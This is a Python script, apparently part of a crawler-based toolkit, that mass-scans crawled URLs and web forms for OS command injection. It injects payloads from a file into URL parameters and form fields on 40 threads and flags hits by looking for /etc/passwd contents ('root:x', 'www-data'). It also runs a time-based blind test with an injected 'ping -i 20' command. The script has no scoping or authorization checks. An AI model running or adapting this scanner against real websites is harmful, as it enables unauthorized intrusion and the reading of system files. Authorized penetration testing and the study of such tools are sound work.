import os

import requests
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as bs
import time

threads = 40
patterns = ['root:x', 'www-data']
timebased_command = 'ping -i 20'
timeout = 30
base_path=os.path.dirname(os.path.abspath(__file__))
input_file = os.path.join(os.path.dirname(base_path),"crawler",'links.txt')
output_file = os.path.join(base_path,'found.txt')
output_file_timebased = os.path.join(base_path,'found_timebased.txt')
payload_file = os.path.join(base_path,'payload.txt')
payloads = open(payload_file, mode='r', encoding='utf-8').read().split('\n')


def changeNCheck(link):
    if link == "":
        return
    if '=' not in link:
        with_params = False
    else:
        with_params = True
    link_old = link
    link_temp = link.split('=')[0]
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.193 Safari/537.36'
    }
    print("Checking for payload injection in the parameter")
    for payload in payloads:
        if with_params:
            link = link_temp + '=' + payload
        else:
            link = link_temp
        if with_params:
            print("Checking: {}".format(link))
            try:
                resp = requests.get(link, headers=headers,
                                    timeout=timeout).text
                for pattern in patterns:
                    if pattern in resp:
                        with open(output_file, mode='a+', encoding='utf-8') as f:
                            f.write("{} [Form: {}]\n".format(link, pattern))
                        print("Valid: {} [Form: {}]".format(link, pattern))
                        break
                    else:
                        pass  # print("Invalid: {}".format(link))
            except:
                print("Can't open {}".format(link))
                continue
        print("Accessing {}".format(link_old))
        try:
            resp = requests.get(link_old, headers=headers,
                                timeout=timeout).content
        except:
            print("Failed to open main link {}".format(link_old))
            continue
        soup = bs(resp, 'html.parser')
        forms = soup.findAll('form')
        if len(forms) == 0:
            print("No forms found in {}".format(link_old))
        else:
            print("Form tag exists in the source")
        if soup.find('input') is not None or soup.find('textarea') is not None:
            print("Form exists in {}!".format(link_old))
            with open(os.path.join(base_path,"forms.txt"), mode='a+', encoding='utf-8') as f:
                f.write(link_old + "\n")
        for form in forms:
            action_link = form.get('action')
            if action_link == "":
                action_link = link_old.split('/')[-1]
            method = form.get('method')
            print("Request Method: {}".format(method))
            domain = link.split('://')[0] + "://" + \
                link.split('://')[1].split('/')[0]
            if action_link.startswith('//'):
                action_link = "https:" + action_link
            if not domain.endswith('/'):
                domain = domain + "/"
            if action_link.startswith('/'):
                action_link = "".join(action_link[1::])
            if not action_link.startswith('http'):
                action_link = domain + action_link
            print("EndPoint: {}".format(action_link))
            params_list = form.findAll('input')
            textarea_list = form.findAll('textarea')
            params_name = []
            params_name.extend(
                [x.get('name') for x in params_list if x.get('name') is not None])
            params_name.extend(
                [x.get('name') for x in textarea_list if x.get('name') is not None])
            headers = {
                'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.193 Safari/537.36'
            }
            data = {}
            for param in params_name:
                data[param] = payload
            print("Submitting: {}".format(data))
            if method.lower() == 'get':
                try:
                    resp = requests.get(
                        action_link, headers=headers, params=data).text
                    for pattern in patterns:
                        if pattern in resp:
                            with open(output_file, mode='a+', encoding='utf-8') as f:
                                f.write("{} [Form: {}]\n".format(link, pattern))
                            print("Valid: {} [Form: {}]".format(link, pattern))
                            break
                        else:
                            print("Invalid: {}".format(link))
                except:
                    print("Cannot make GET request to {} with params {}".format(
                        action_link, data))
            else:
                try:
                    resp = requests.post(
                        action_link, headers=headers, data=data).text
                    for pattern in patterns:
                        if pattern in resp:
                            with open(output_file, mode='a+', encoding='utf-8') as f:
                                f.write("{} [Form: {}]\n".format(link, pattern))
                            print("Valid: {} [Form: {}]".format(link, pattern))
                            break
                        else:
                            print("Invalid: {}".format(link))
                except:
                    print("Cannot make POST request to {} with payload {}".format(
                        action_link, data))
            print("Checking timebased payload ...")
            for param in params_name:
                data[param] = timebased_command
            print("Submitting data for timebased ...")
            if method.lower() == 'get':
                try:
                    time1 = time.time()
                    resp = requests.get(
                        action_link, headers=headers, params=data).text
                    time2 = time.time()
                    timet = time2 - time1
                    timet = str(timet)
                    timet = timet.split(".")
                    timet = timet[0]
                    if int(timet) >= 2:
                        with open(output_file_timebased, mode='a+', encoding='utf-8') as f:
                            f.write(link + "\n")
                        print("Valid: {}".format(link))
                    else:
                        print("Invalid: {}".format(link))
                except:
                    print("Cannot make GET request to {} with params {}".format(
                        action_link, data))
            else:
                try:
                    time1 = time.time()
                    resp = requests.post(
                        action_link, headers=headers, data=data).text
                    time2 = time.time()
                    timet = time2 - time1
                    timet = str(timet)
                    timet = timet.split(".")
                    timet = timet[0]
                    if int(timet) >= 2:
                        with open(output_file_timebased, mode='a+', encoding='utf-8') as f:
                            f.write(link + "\n")
                        print("Valid: {}".format(link))
                    else:
                        print("Invalid: {}".format(link))
                except:
                    print("Cannot make POST request to {} with payload {}".format(
                        action_link, data))


def command_injection():
    links = open(input_file, mode='r', encoding='utf-8').read().split('\n')
    with ThreadPoolExecutor(max_workers=threads) as pool:
        pool.map(changeNCheck, links)

if __name__=="__main__":
    command_injection()
